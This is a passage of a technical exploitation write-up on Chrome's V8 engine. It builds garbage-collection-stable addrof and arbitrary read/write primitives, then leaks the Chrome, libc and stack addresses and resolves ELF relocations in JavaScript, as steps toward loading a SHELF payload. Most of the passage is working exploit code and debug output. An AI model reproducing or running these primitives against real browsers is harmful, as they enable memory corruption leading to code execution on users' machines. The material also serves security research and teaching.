</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we see the output of this script, we will see the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="mh">0x350808087859</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">1073741820</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x350808087889</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x3508080878e1</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Forcing</span> <span class="nx">GC</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x3508083826e5</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">1073741820</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x3508083826f5</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x350808382705</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can notice, the addresses of all the objects have changed after the first <code>Scavenge</code> GC, as they were evacuated to <code>to-space</code> young generation region. This entails that if objects change in location, the memory layout that our exploitation primitives are built on top of will also change, and consequently our exploit primitives break.</p>
<p>This specifically impacts primitives build on top of OOB reads and writes, as these will be misplaced by reading <code>to-space</code> memory rather than <code>from-space</code> memory, having little control over the layout of live objects in this new memory region, and even if we do, remaining live objects will eventually be promoted to <code>Old Space</code>.</p>
<p>This is important to understand, because our <code>addrof</code> primitive relies on OOB reads and writes, as well as our <code>arb_read</code> and <code>arb_write</code> primitives, which are bound to our <code>weak_write</code> primitive that is prone to the same problem.</p>
<p>There are likely several solutions to circumvent this problem. It is technically possible to craft our exploitation primitives after the promotion of dedicated objects to <code>Old Space</code>. However, there is always a possibility of an <code>Evacuation GC</code> to be triggered on a Major GC, which will provoke objects from <code>Old Space</code> to be rearranged for sake of memory defragmentation.</p>
<p>Although Major GCs are not triggered that often, and <code>Old Space</code> region has to be fragmented from objects to be rearranged, leveraging objects in <code>Old Space</code> may not be a long-term realiable solution.</p>
<p>Another approach is to use objects placed within <code>Large Object Space</code> region since these objects will not be garbage collected.
I first saw this technique while reading Brendon Tiszka&rsquo;s awesome <a href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">post</a>, in which he points out that if an object size exceeds the constant <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=360;drc=64556d13a49f535430733d86bc5a6a0f36ae7d56">kMaxRegularHeapObjectSize</a> (defined as <code>1048576</code>) that object will be placed in <code>Large Object Space</code>.</p>
<p>Following this premise, we can construct an <code>addrof</code> primitive resilient to garbage collection:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">/// constructing stable addrof
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">lo_array_obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1048577</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">elements_ptr</span> <span class="o">=</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">lo_array_obj</span><span class="p">))</span> <span class="o">+</span> <span class="mi">8</span><span class="nx">n</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">elements_ptr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">elements_ptr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">leak_array_buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">dd</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">leak_array_buffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">leak_array_buffer_addr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">leak_array_buffer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">backing_store_ptr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">leak_array_buffer_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">elements_ptr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">root_isolate</span><span class="p">)</span> <span class="o">|</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">elements_ptr</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">weak_write</span><span class="p">(</span><span class="nx">backing_store_ptr</span><span class="p">,</span> <span class="nx">elements_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">stable_addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">lo_array_obj</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">dd</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span> <span class="kc">true</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In order to create a set of stable arbitrary read/write primitives, we have to build these primitives without relying on V8 objects that will be garbage collected.</p>
<p>In order to achiveve this, we can overwrite the <code>backing store</code> of an <code>ArrayBuffer</code> with an arbitrary unboxed pointer that is not held within the V8 heap.</p>
<p>This limits us to use any address residing within V8&rsquo;s heap. Ironically, a neat way to gain arbitrary read/write to any arbitrary address on the V8 heap using this technique (as showcased by the exploit in Brendon&rsquo;s post) is by leveraging our previously leaked <code>root_isolate</code> as the ArrayBuffer&rsquo;s <code>backing store</code> value. This address denoting the V8 heap base won&rsquo;t change for the lifetime of the current process. Modifying the bound <code>DataView</code> object length will also enable using the V8 compressed untagged pointers as offsets:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// constructing stable read/write for v8 heap
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">heap</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">heap_accesor</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">heap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">heap_addr_backing_store</span> <span class="o">=</span>  <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">stable_addrof</span><span class="p">(</span><span class="nx">heap</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">heap_accesor_length</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">stable_addrof</span><span class="p">(</span><span class="nx">heap_accesor</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// overwritting ArrayBuffer backing store
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">weak_write</span><span class="p">(</span><span class="nx">heap_addr_backing_store</span><span class="p">,</span> <span class="nx">root_isolate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">// overwritting Dataview length
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">weak_write</span><span class="p">(</span><span class="nx">heap_accesor_length</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We will be using this technique in order to build accessors to distinct memory regions outside of V8 heap moving forward.</p>
<br />
<hr>
<h2 id="obtaining-relevant-leaks">Obtaining relevant leaks</h2>
<p>Now that we have the capability to read and write arbitrary memory in a stable manner, we now have to locate specific memory regions that we will need to access in order to craft our SHELF loader.</p>
<p>The following diagram illustrates the pointer relationships of the different memory regions we are interested in:</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/2022-02-16_23-09_1.png" /></div>
<h3 id="leaking-chrome-base">Leaking Chrome base</h3>
<p>Leaking chrome&rsquo;s base is relatively simple and can be illustrated in the following code snippet:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">get_image_base</span><span class="p">(</span><span class="nx">ptr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dword</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">centinel</span> <span class="o">=</span> <span class="nx">ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nx">dword</span> <span class="o">!==</span> <span class="mh">0x464c457f</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">centinel</span> <span class="o">-=</span> <span class="mh">0x1000</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dword</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">centinel</span><span class="p">),</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">centinel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">div</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">div_addr</span> <span class="o">=</span> <span class="nx">stable_addrof</span><span class="p">(</span><span class="nx">div</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">_HTMLDivElement</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">div_addr</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xC</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">HTMLDivElement_addr</span> <span class="o">=</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">_HTMLDivElement</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">ptr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">HTMLDivElement_addr</span><span class="p">)</span> <span class="o">-</span> <span class="nx">kBaseSearchSpaceOffset</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="nx">n</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">chrome_base</span> <span class="o">=</span> <span class="nx">get_image_base</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">ptr</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In order to leak the base address of Chrome, we start by creating an arbitrary DOM element. Usually, DOM elements have references within their object layout to some part of Blink&rsquo;s code base. As an example, we can create a <code>div</code> element to leak one of these pointers and then subtract the appropriate offset from it to retrieve Chrome&rsquo;s base, or scan backward in search for an ELF header magic.</p>
<h3 id="leaking-libc-base">Leaking Libc base</h3>
<p>Once we have successfully retrieved the base of Chrome, we can retrieve a pointer to libc from Chrome&rsquo;s Global Offset Table (GOT), as this should be a fixed offset per Chrome patch level. After that, we can apply the same methodology as for retrieving the base address of Chrome, by scanning backward for an ELF header magic:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">libc_leak</span> <span class="o">=</span> <span class="nx">chrome_accesor</span><span class="p">.</span><span class="nx">getFloat64</span><span class="p">(</span><span class="nx">kGOTOffset</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">libc_leak</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">libc_leak</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="nx">n</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">libc_base</span> <span class="o">=</span> <span class="nx">get_image_base</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">libc_leak</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="leaking-the-process-stack">Leaking the process stack</h3>
<p>Now that we have libc&rsquo;s base address, we can retrieve the symbol <code>__environ</code> from libc as it will point to the process&rsquo; environment variables held in the stack.
Since for this post we are writing an exploit that is dependent of Chrome version, we need to be able to resolve the address of this symbol independently of libc version.
To do this, we can build a resolver in JavaScript leveraging our stable read primitive.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">elf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Elf</span><span class="p">(</span><span class="nx">libc_base</span><span class="p">,</span> <span class="nx">libc_accesor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">environ_addr</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">resolve_reloc</span><span class="p">(</span><span class="s2">&#34;__environ&#34;</span><span class="p">,</span> <span class="nx">R_X86_64_GLOB_DAT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">stack_leak</span> <span class="o">=</span> <span class="nx">libc_accesor</span><span class="p">.</span><span class="nx">getBigUint64</span><span class="p">(</span><span class="nb">Number</span><span class="p">(</span><span class="nx">environ_addr</span><span class="o">-</span><span class="nx">libc_base</span><span class="p">),</span> <span class="kc">true</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ultimately, we have to retrieve the address of libc&rsquo;s  <code>DYNAMIC</code> segment to resolve various dynamic entries including the address of the relocation table held in <code>DT_RELA</code> in order to scan for relocations, the address of <code>DT_STRTAB</code> for accessing the <code>.dynstr</code> and the address of <code>DT_SYMTAB</code> for accessing symbol entries in <code>.dynsym</code>.</p>
<p>We can then iterate the relocation table to search for the symbol we want. A snippet of the relevant code of this ELF resolver to retrieve relocation entries is shown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">phnum</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">offsetof_phnum</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">phoff</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">offsetof_phoff</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">phnum</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">offset</span> <span class="o">=</span>  <span class="nx">phoff</span> <span class="o">+</span> <span class="nx">sizeof_Elf64_Phdr</span> <span class="o">*</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">p_type</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">offset</span> <span class="o">+</span> <span class="nx">offsetof_p_type</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">p_type</span> <span class="o">==</span> <span class="nx">PT_DYNAMIC</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dyn_phdr</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">dyn_phdr_filesz</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">phoff</span> <span class="o">+</span> <span class="nx">sizeof_Elf64_Phdr</span> <span class="o">*</span> <span class="nx">dyn_phdr</span> <span class="o">+</span> <span class="nx">offsetof_p_filesz</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">dyn_phdr_vaddr</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">phoff</span> <span class="o">+</span> <span class="nx">sizeof_Elf64_Phdr</span> <span class="o">*</span> <span class="nx">dyn_phdr</span> <span class="o">+</span> <span class="nx">offsetof_p_vaddr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">dyn_phdr_filesz</span><span class="o">/</span><span class="nx">sizeof_Elf64_Dyn</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dyn_offset</span> <span class="o">=</span>  <span class="nx">dyn_phdr_vaddr</span> <span class="o">+</span> <span class="nx">sizeof_Elf64_Dyn</span> <span class="o">*</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">d_tag</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">dyn_offset</span> <span class="o">+</span> <span class="nx">offsetof_d_tag</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">d_val</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">base_addr</span> <span class="o">+</span> <span class="nx">dyn_offset</span> <span class="o">+</span> <span class="nx">offsetof_d_un_d_val</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nx">d_tag</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_PLTGOT</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">pltgot</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_JMPREL</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">jmprel</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_PLTRELSZ</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">pltrelsz</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_SYMTAB</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">symtab</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_STRTAB</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">strtab</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">DT_STRSZ</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">strsz</span> <span class="o">=</span> <span class="nx">d_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
